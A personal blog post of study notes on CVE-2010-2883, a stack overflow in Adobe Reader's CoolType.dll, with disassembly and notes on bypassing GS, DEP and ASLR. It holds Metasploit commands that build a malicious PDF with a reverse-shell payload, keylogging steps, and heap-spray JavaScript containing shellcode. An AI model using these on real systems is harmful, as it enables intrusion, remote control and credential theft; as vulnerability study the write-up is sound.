<!DOCTYPE html>
<html lang="en">

<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
	
	<!-- title -->
	
	<title>
	
		漏洞战争学习笔记1：CVE-2010-2883 | 
	 
	Sinky-wang
	</title>
	
	<!-- keywords,description -->
	 

	<!-- favicon -->
	
	<link rel="shortcut icon" href="/favicon.ico">
	
  

	
<link rel="stylesheet" href="/css/main.css">

	
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">

	
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/styles/darcula.min.css">


	
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/highlight.min.js"></script>

	
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>

	
<script src="https://cdn.jsdelivr.net/npm/jquery-pjax@2.0.1/jquery.pjax.min.js"></script>

	
<script src="/js/main.js"></script>

	
		
<script src="https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min.js"></script>

		
<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>

	
	
		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	
<meta name="generator" content="Hexo 4.2.0"></head>

<body>
	<header id="header">
    <a id="title" href="/" class="logo">Sinky-wang</a>

	<ul id="menu">
		<li class="menu-item">
			<a href="/about" class="menu-item-link">ABOUT</a>
		</li>
		
		<li class="menu-item">
			<a href="https://github.com/wujun234/uid-generator-spring-boot-starter" class="menu-item-link" target="_blank">
				UidGenerator
			</a>
		</li>
		<li class="menu-item">
			<a href="https://github.com/wujun234" class="menu-item-link" target="_blank">
				<i class="fa fa-github fa-2x"></i>
			</a>
		</li>
	</ul>
</header>

	
<div id="sidebar">
	<button id="sidebar-toggle" class="toggle" ><i class="fa fa-arrow-right " aria-hidden="true"></i></button>
	
	<div id="site-toc">
		<input id="search-input" class="search-input" type="text" placeholder="search...">
		<div id="tree">
			

			
							<ul>
								<li class="file">
									<a href="/2020/08/13/CVE-2006-3439/">
										CVE-2006-3439
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/13/CVE-2019-0708/">
										CVE-2019-0708
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/14/CVE-2019-0808/">
										CVE-2019-0808
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/12/CVE-2019-5786/">
										CVE-2019-5786
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/17/CVE-2020-6418/">
										CVE-2020-6418
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/14/Chrome%E8%B0%83%E8%AF%95%20CVE-2019-5768/">
										Chrome调试 CVE-2019-5768
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/">
										JIT学习
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/08/Loving%20strangers/">
										Loving strangers
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/30/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/">
										SQL学习与整理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/25/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">
										UAF漏洞简单学习
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">
										V8漏洞初学习
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/31/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/">
										WinDbg使用整理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/25/%E5%88%9D%E8%AF%86Meterpreter/">
										初识Meterpreter
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">
										攻防世界-pwn-dice_game
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/">
										攻防世界-pwn-level3
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">
										攻防世界-pwn-stack2
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/">
										攻防世界-pwn-反应釜开关控制
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/">
										攻防世界pwn-100
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/">
										攻防世界pwn-cgpwn2
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/">
										攻防世界pwn-guess_num
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/">
										攻防世界pwn-int_overflow
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/">
										攻防世界pwn-string
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file active">
									<a href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/">
										漏洞战争学习笔记1：CVE-2010-2883
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2020/07/31/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/">
										漏洞战争学习笔记2：CVE-2010-3333
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
		</div>
	</div>
</div>

	<!-- 引入正文 -->
	<div id="content">
		<h1 id="article-title">

	漏洞战争学习笔记1：CVE-2010-2883
</h1>
<div class="article-meta">
	
	<span>Sinky-wang</span>
	<span>2020-07-20 10:57:14</span>
    
		<div id="article-categories">
            
		</div>
    
</div>

<div id="article-content">
	<h2 id="漏洞背景介绍"><a href="#漏洞背景介绍" class="headerlink" title="漏洞背景介绍"></a>漏洞背景介绍</h2><p>CVE-2010-2883是Adobe Reader 和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的pdf文件就有可能导致执行任意代码。</p>
<h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><p>操作系统：Windows XP SP3<br>调试器：OllyDbg<br>反汇编：IDA pro 7.2<br>目标：Adobe Reader 9.3.0</p>
<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><ul>
<li>攻击机：kali</li>
<li>靶机：windows xp sp3</li>
</ul>
<p>kali机上，打开msfconsole,使用metasploit生成pdf木马文件</p>
<ul>
<li>msfconsole -q //进入msf框架</li>
<li>search cve-2010-2883 //找到漏洞模块</li>
<li>use exploit/windows/fileformat/adobe_cooltype_sing //使用模块</li>
<li>set payload windows/meterpreter/reverse_tcp //调用meterpreter载荷，反向连接到渗透机</li>
<li>set lhost 192.168.119.128 //设置主机ip</li>
<li>set FileNAME 2883.pdf //设置生产带有后门pdf文件名</li>
<li>set lport 99999 //设置本地监听端口</li>
<li>exploit //执行渗透生成文件成功</li>
</ul>
<p>将文件拷贝到windows xp（靶机）。</p>
<p>metasploit开启shell监听会话</p>
<p><img src="https://i.loli.net/2020/07/20/WvKMtdn3P8bx5cB.png" alt="获取到shell.PNG"></p>
<ul>
<li>back</li>
<li>use exploit/multi/handler //使用hhandler监听模块</li>
<li>set payload windows/meterpreter/reverse_tcp</li>
<li>set lhost 192.168.119.128 //设置及监听IP地址（kali）</li>
<li>set lport 9999 //设置监听的端口（与pdg文件一致）</li>
<li>exploit //开启监听</li>
</ul>
<p>靶机打开2883.pdf文件，kali端即可获取shell会话。</p>
<ul>
<li>sysinfo //查看系统信息</li>
<li>getuid //查看当前用户</li>
<li>screenshot //截屏查看靶机桌面</li>
<li>ps //查看进程</li>
<li>migrate 148 //切换进程到148 </li>
<li>shell //获取到Dos shell</li>
<li>keyscan_start //开启键盘记录</li>
<li>keyscan_dump //输出键盘记录</li>
</ul>
<h2 id="0x02-基于字符串定位的漏洞分析方法"><a href="#0x02-基于字符串定位的漏洞分析方法" class="headerlink" title="0x02 基于字符串定位的漏洞分析方法"></a>0x02 基于字符串定位的漏洞分析方法</h2><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p>打开cooltype.dll，alt+t搜索“SING”，依次进入检查是否有敏感信息，大概是第二个SING,发现调用函数sttrcat，在拼接字符串时未进行长度检查，可能会造成栈溢出，strcat为溢出点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DBF2                 push    ebp</span><br><span class="line">.text:0803DBF3                 sub     esp, 104h       ; 分配栈空间0x104h</span><br><span class="line">.text:0803DBF9                 lea     ebp, [esp-4]    ; 后面的strcat会将执行结果保存在ebp中，strcat的目的地</span><br><span class="line">.text:0803DBFD                 mov     eax, ___security_cookie ；安全cookie</span><br><span class="line">.text:0803DC02                 xor     eax, ebp ;cookie^ebp(sep-4);</span><br><span class="line">.text:0803DC04                 mov     [ebp+108h+var_4], eax ;将cookie保存到栈，以作安全检查</span><br><span class="line">.text:0803DC0A                 push    4Ch</span><br><span class="line">.text:0803DC0C                 mov     eax, offset loc_81847C4</span><br><span class="line">.text:0803DC11                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DC16                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DC28                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DC2B                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DC2E                 call    sub_8041626</span><br><span class="line">.text:0803DC33                 xor     esi, esi</span><br><span class="line">.text:0803DC35                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DC39 ;   try &#123;</span><br><span class="line">.text:0803DC39                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DC3C                 jz      loc_803DDF9</span><br><span class="line">.text:0803DC42                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC45                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DC48 ;   &#125; &#x2F;&#x2F; starts at 803DC39</span><br><span class="line">.text:0803DC4C ;   try &#123;</span><br><span class="line">.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DC50                 jnz     loc_803DDA2</span><br><span class="line">.text:0803DC56                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DC5B                 push    edi             ; int</span><br><span class="line">.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DC5F                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DC63                 call    sub_802178F</span><br><span class="line">.text:0803DC68                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DC6B                 jnz     short loc_803DCD6</span><br><span class="line">.text:0803DC6D                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DC72                 push    edi             ; int</span><br><span class="line">.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; ecx传参，thiscall调用约定，推测指向sing表入口</span><br><span class="line">.text:0803DC76                 call    sub_8021ABE     ; 处理sing表</span><br><span class="line">.text:0803DC7B                 mov     eax, [ebp+108h+var_12C] ；SING表地址给eax</span><br><span class="line">.text:0803DC7E                 cmp     eax, esi        ; 判断是否为空</span><br><span class="line">.text:0803DC7E ;   &#125; &#x2F;&#x2F; starts at 803DC4C</span><br><span class="line">.text:0803DC80 ;   try &#123;</span><br><span class="line">.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DC84                 jz      short loc_803DCBD ; 不跳转</span><br><span class="line">.text:0803DC86                 mov     ecx, [eax]      ; 字体资源版本号，这里为1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DC88                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DC8E                 jz      short loc_803DC98 ; 跳转</span><br><span class="line">.text:0803DC90                 cmp     ecx, 100h</span><br><span class="line">.text:0803DC96                 jnz     short loc_803DCB9</span><br><span class="line">.text:0803DC98</span><br><span class="line">.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j</span><br><span class="line">.text:0803DC98                 add     eax, 10h        ; 相对sing表入口偏移0x10处找到uniqueName</span><br><span class="line">.text:0803DC9B                 push    eax             ; Source 源地址，长度不固定</span><br><span class="line">.text:0803DC9C                 lea     eax, [ebp+108h+Dest] ；eax&#x3D;ebp+108-108&#x3D;ebp;ebp&#x3D;esp-4,即复制到栈顶部位置</span><br><span class="line">.text:0803DC9F                 push    eax             ; Dest 目的地址：固定大小的栈空间</span><br><span class="line">.text:0803DCA0                 mov     [ebp+108h+Dest], 0 ；清0</span><br><span class="line">.text:0803DCA4                 call    strcat          ; 未检查大小，造成溢出</span><br></pre></td></tr></table></figure>
<blockquote>
<p>GS:由IDA汇编分析，函数开始出有安全cookie，判定存在GS机制。<br>DEP:数据执行保护，即没有执行权限的内存空间不允许执行代码。<br>ASLR:地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor打开目标exe，找到相关字段，发现已开启。</p>
</blockquote>
<p><img src="https://i.loli.net/2020/07/24/aLpHZ9y4qbc7dAu.png" alt="图片.png"></p>
<h3 id="SING表结构分析"><a href="#SING表结构分析" class="headerlink" title="SING表结构分析"></a>SING表结构分析</h3><p>在kali生成的msf.pdf文件，使用PdfStreamDumper打开，在第十个Stream中找到Sing字段，将整合各Stream另存为TTF文件。</p>
<p><img src="https://i.loli.net/2020/07/24/fEzYQ4GMuwoDvP3.png" alt="工具找到sing字段.PNG"></p>
<p><img src="https://i.loli.net/2020/07/24/41Jd3hzA8G6fyYw.png" alt="捕获.PNG"><br>官方文档中对TableEntry结构的定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">char tag[4]; &#x2F;&#x2F;标记：“SING”</span><br><span class="line">ULNG checkSum; &#x2F;&#x2F;校验和：“0xD9BCC8B5”</span><br><span class="line">ULNG offset; &#x2F;&#x2F;相对文件的偏移：“0x0000011C”</span><br><span class="line">ULONG length; &#x2F;&#x2F;数据长度：“0x00001DDF”</span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/07/24/J8laM9DIOiYHeg7.png" alt="TTF的tableentry结构.PNG"></p>
<h3 id="JS堆喷射代码"><a href="#JS堆喷射代码" class="headerlink" title="JS堆喷射代码"></a>JS堆喷射代码</h3><p>在第一个object处找到OpenAction,表示在第11个obj中，pdf运行时会执行里面脚本。</p>
<p><img src="https://i.loli.net/2020/07/24/a3IvshLZowWm1xn.png" alt="捕获.PNG"></p>
<p>进入第11个obj，表示执行的js代码位于第12个obj中。</p>
<p><img src="https://i.loli.net/2020/07/24/yxZ5nCGAFtvorkJ.png" alt="捕获.PNG"></p>
<p>进入第12个obj，发现实现堆喷射的js脚本。代码是经过混淆的，简单整理后获得js代码。（此处使用大佬整理好的了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var shellcode &#x3D; unescape( &#39;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23&#39; );</span><br><span class="line">var nop &#x3D; unescape( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (nop.length + 20 + 8 &lt; 65536)</span><br><span class="line"> nop+&#x3D;nop;</span><br><span class="line">d &#x3D; nop.substring(0, (0x0c0c-0x24)&#x2F;2);</span><br><span class="line">d +&#x3D; shellcode;</span><br><span class="line">d +&#x3D; nop;</span><br><span class="line">e &#x3D; d.substring(0, 65536&#x2F;2);</span><br><span class="line">while(e.length &lt; 0x80000)</span><br><span class="line"> e +&#x3D; e;</span><br><span class="line">h &#x3D; e.substring(0, 0x80000 - (0x1020-0x08) &#x2F; 2);</span><br><span class="line">var slide &#x3D; new Array();</span><br><span class="line">for (i&#x3D;0;i&lt;0x1f0;i++)</span><br><span class="line"> slide[i]&#x3D;h+&quot;s&quot;;</span><br></pre></td></tr></table></figure>

<p>从TableEntry结构入口偏移0x11C即使SING表的真实数据，即从“00 00 01 00”开始的部分，接着再偏移0x10即可找到uniqueName域。</p>
<p><img src="https://i.loli.net/2020/07/24/Ttae68OBCbc9GnL.png" alt="uniquename.PNG"></p>
<p>执行strcat后会将“58 E0 8D AD”起始部分复制到ebp的指定地址，直到遇见NULL字符.</p>
<h3 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h3><ul>
<li>打开AR,OD中附加进程Cooltype.dll,溢出点strcat处下断点。</li>
</ul>
<p><img src="https://i.loli.net/2020/07/24/3AdJB9OGqLC2aHz.png" alt="捕获.PNG"></p>
<ul>
<li>溢出前，源地址数据如下，是SING表中的uniqueName字段的内容：</li>
</ul>
<p><img src="https://i.loli.net/2020/07/24/xjGeuh3y5vw1TKn.png" alt="捕获.PNG"></p>
<p>正常情况下uniqueName字段为28字节，远小于栈空间大小0x104，就不会发生溢出。但是如果经过特殊构造，基于strcat复制内存时的特性（遇见NULL才停止）则会出现溢出。</p>
<ul>
<li>单步执行strcat函数后，目标地址位于栈中，站遭破坏，发生栈溢出。</li>
</ul>
<p><img src="https://i.loli.net/2020/07/24/1PhXAiMLfqOld2j.png" alt="捕获.PNG"></p>
<ul>
<li>将上面复制进去的数据下内存访问断点，执行，直到遇到call。但是这一步我始终跳不过去，程序往往会直接终止。后面我直接把call改成了retn，成功跳过，但是在内存访问断点之后遇到一个call又会终止程序，很糟心。</li>
</ul>
<h2 id="0x03-exploit分析"><a href="#0x03-exploit分析" class="headerlink" title="0x03 exploit分析"></a>0x03 exploit分析</h2><p>漏洞成因：Cooltype.dll中使用strcat函数时未对uniqueName字段的字符串长度进行检查，直接复制到固定大小的栈空间，最终导致栈溢出，攻击者篡改了TTF文件，在pdf文件中嵌入了JS脚本。</p>
<h2 id="0x04-知识总结"><a href="#0x04-知识总结" class="headerlink" title="0x04 知识总结"></a>0x04 知识总结</h2><h3 id="绕过GS"><a href="#绕过GS" class="headerlink" title="绕过GS"></a>绕过GS</h3><ul>
<li>通过安全cookie的检查，可以很好的探测栈是否被破坏/溢出；但是其也有很大弊端：只有在函数返回前，才会去检查security cookie，在之前是没有任何保护措施的.</li>
<li>只要在安全cookie被检查之前劫持程序流程，就可无视GS保护，如OD中所示，产生溢出后，下内存访问断点，会有call 栈内数据的操作，由此直接劫持程序流程，从而绕过GS</li>
</ul>
<h3 id="绕过DEP"><a href="#绕过DEP" class="headerlink" title="绕过DEP"></a>绕过DEP</h3><ul>
<li>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>
<li>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>
<li>进一步调用memcpy将shellcode复制到此空间，从而实现shellcode的执行，绕过DEP</li>
</ul>
<h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><ul>
<li>开启ASLR后，其对堆基址做了随机化处理，但对于Heap Spray来说是无效的</li>
<li>不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的0x0c0c0c0c地址，因此，Heap spray 完全可以绕过 ASLR </li>
</ul>
<h3 id="调试思路总结"><a href="#调试思路总结" class="headerlink" title="调试思路总结"></a>调试思路总结</h3><ul>
<li>构造恶意数据，实现栈溢出</li>
<li>函数返回前（安全cookie检查前），调用恶意数据中的地址，开始实施ROP</li>
<li>通过ROP，劫持执行流程指向0x0C0C0C0C</li>
<li>js堆喷射覆盖地址0x0C0C0C0C，从而执行另一块ROP</li>
<li>ROP块中为进程申请可执行权限的内存空间，并将shellcode复制其中</li>
<li>shellcode执行，成功利用！</li>
</ul>
<blockquote>
<p>太难啦OD动态调试调不出来！到底是因为啥子啊啊啊啊啊</p>
</blockquote>

</div>


    <div class="post-guide">
        <div class="item left">
            
              <a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">
                  <i class="fa fa-angle-left" aria-hidden="true"></i>
                  攻防世界-pwn-dice_game
              </a>
            
        </div>
        <div class="item right">
            
              <a href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/">
                JIT学习
                <i class="fa fa-angle-right" aria-hidden="true"></i>
              </a>
            
        </div>
    </div>



	<div id="vcomments"></div>


<script>
	
		// 评论
		new Valine({
			av: AV,
			el: '#vcomments',
			notify: false,
			verify: false,
			path: window.location.pathname,
			appId: '',
			appKey: '',
			placeholder: '请输入评论',
			avatar: 'retro',
			recordIP: false
		})
	
	
</script>
	</div>
	<div id="footer">
	<p>
	©2019-<span id="footerYear"></span> 
	<a href="/">Sinky-wang</a> 
	
	
		|
		<span id="busuanzi_container_site_pv">
			pv
			<span id="busuanzi_value_site_pv"></span>
		</span>
		|
		<span id="busuanzi_container_site_uv"> 
			uv
			<span id="busuanzi_value_site_uv"></span>
		</span>
	
	<br>
	Theme <a href="//github.com/wujun234/hexo-theme-tree" target="_blank">Tree</a>
	by <a href="//github.com/wujun234" target="_blank">WuJun</a>
	Powered by <a href="//hexo.io" target="_blank">Hexo</a>
	</p>
</div>
<script type="text/javascript"> 
	document.getElementById('footerYear').innerHTML = new Date().getFullYear() + '';
</script>
	<button id="totop-toggle" class="toggle"><i class="fa fa-angle-double-up" aria-hidden="true"></i></button>
</body>
</html>